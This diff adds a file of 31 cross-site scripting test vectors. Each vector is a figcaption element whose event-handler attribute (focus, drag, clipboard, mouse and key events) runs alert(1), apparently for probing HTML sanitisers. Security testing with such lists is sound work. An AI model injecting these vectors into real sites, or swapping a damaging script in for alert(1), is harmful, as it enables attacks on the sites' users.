@@ -1,0 +1,31 @@
+<figcaption draggable="true" ondragend="alert(1)">test</figcaption>
+<figcaption draggable="true" ondragenter="alert(1)">test</figcaption>
+<figcaption draggable="true" ondragleave="alert(1)">test</figcaption>
+<figcaption draggable="true" ondragstart="alert(1)">test</figcaption>
+<figcaption id=x tabindex=1 onactivate=alert(1)></figcaption>
+<figcaption id=x tabindex=1 onbeforeactivate=alert(1)></figcaption>
+<figcaption id=x tabindex=1 onbeforedeactivate=alert(1)></figcaption><input autofocus>
+<figcaption id=x tabindex=1 ondeactivate=alert(1)></figcaption><input id=y autofocus>
+<figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>
+<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>
+<figcaption onbeforecopy="alert(1)" contenteditable>test</figcaption>
+<figcaption onbeforecut="alert(1)" contenteditable>test</figcaption>
+<figcaption onbeforepaste="alert(1)" contenteditable>test</figcaption>
+<figcaption onblur=alert(1) tabindex=1 id=x></figcaption><input autofocus>
+<figcaption onclick="alert(1)">test</figcaption>
+<figcaption oncontextmenu="alert(1)">test</figcaption>
+<figcaption oncopy="alert(1)" contenteditable>test</figcaption>
+<figcaption oncut="alert(1)" contenteditable>test</figcaption>
+<figcaption ondblclick="alert(1)">test</figcaption>
+<figcaption onfocusout=alert(1) tabindex=1 id=x></figcaption><input autofocus>
+<figcaption onkeydown="alert(1)" contenteditable>test</figcaption>
+<figcaption onkeypress="alert(1)" contenteditable>test</figcaption>
+<figcaption onkeyup="alert(1)" contenteditable>test</figcaption>
+<figcaption onmousedown="alert(1)">test</figcaption>
+<figcaption onmouseenter="alert(1)">test</figcaption>
+<figcaption onmouseleave="alert(1)">test</figcaption>
+<figcaption onmousemove="alert(1)">test</figcaption>
+<figcaption onmouseout="alert(1)">test</figcaption>
+<figcaption onmouseover="alert(1)">test</figcaption>
+<figcaption onmouseup="alert(1)">test</figcaption>
+<figcaption onpaste="alert(1)" contenteditable>test</figcaption>
